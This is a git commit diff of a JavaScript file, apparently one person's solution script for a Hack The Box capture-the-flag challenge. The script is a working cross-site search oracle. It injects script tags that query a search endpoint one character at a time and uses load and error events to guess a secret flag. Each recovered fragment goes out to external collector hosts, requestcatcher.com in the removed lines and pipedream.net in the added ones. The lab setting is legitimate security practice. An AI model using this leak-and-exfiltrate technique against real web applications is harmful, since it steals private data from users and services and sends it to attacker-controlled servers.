d102f1a4a525799b06253771d350b7566fc0397b
Khaing Myel Khant <khaingmyelkhant@ucsm.edu.mm>
2022-11-18 11:38:30 +0630

    Update main.js

--- js/main.js
+++ js/main.js
@@ -1,39 +1,56 @@
 var chars =
-	"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"$'()+,-./:;<=>?@[\\]^`{|}_";
+	"-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
+
+var special = "_";
 var charLen = chars.length;
 var ENDPOINT =
-	"http://127.0.0.1:31604/api/entries/search?q=";
+	"http://127.0.0.1:30753/api/entries/search?q=";
 
-const search = (leak, charCounter) => {
-	// Check if the character is valid
-	var curChar = chars[charCounter];
+var flag = "HTB{";
 
-	let script = document.createElement("script");
-	script.src = ENDPOINT + leak + curChar;
-	document.head.appendChild(script);
+const getPartial = (char) => {
+	return new Promise((resolve, reject) => {
+		const script = document.createElement("script");
+		script.src = ENDPOINT + flag + char;
+		document.head.appendChild(script);
 
-	// console.log(script.src);
-	script.onload = () => {
-		fetch(
-			"https://khaingmyel.requestcatcher.com/test/flag?=" +
-				escape(leak) +
-				curChar,
-			{
+		script.onload = () => {
+			fetch("https://enancxlxuxj2.x.pipedream.net/flag=" + flag + char, {
 				method: "GET",
 				mode: "no-cors",
-				credentials: "include",
-			}
-		);
-		leak += curChar;
-		search(leak, (charCounter + 1) % charLen);
-	};
-	script.onerror = () => {
-		search(leak, (charCounter + 1) % charLen);
-	};
+			});
+			resolve(char);
+		};
+		script.onerror = () => {
+			reject(char);
+		};
+	});
 };
 
-function exploit() {
-	search("HTB{", 0);
-}
+const exploit = async () => {
+	let b = false;
+
+	for (let i = 0; i < chars.length; i++) {
+		let curChar = special.includes(chars[i])
+			? "" + chars[i]
+			: chars[i];
+		await getPartial(curChar)
+			.then((res) => {
+				if (res === "}") {
+					flag += res;
+					b = true;
+				} else {
+					flag += res;
+					i = 0;
+				}
+			})
+			.catch((e) => null);
+
+		if (b) {
+			console.log(flag);
+			break;
+		}
+	}
+};
 
 exploit();
